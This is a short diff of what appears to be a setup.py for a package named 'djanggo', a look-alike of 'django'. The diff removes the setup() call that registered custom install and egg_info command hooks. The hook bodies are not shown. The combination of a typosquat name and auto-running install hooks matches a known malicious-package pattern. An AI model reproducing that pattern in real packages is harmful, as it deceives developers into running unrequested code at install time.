@@ -40,10 +40,4 @@ class RunInstallCommand(install):
         install.run(self)
 
 
-setup(
-    name="djanggo",
-    version="0.0.6",
-    license="MIT",
-    packages=find_packages(),
-    cmdclass={"install": RunInstallCommand, "egg_info": RunEggInfoCommand},
-)
+# setup(...) removed                                                                                                                                                          
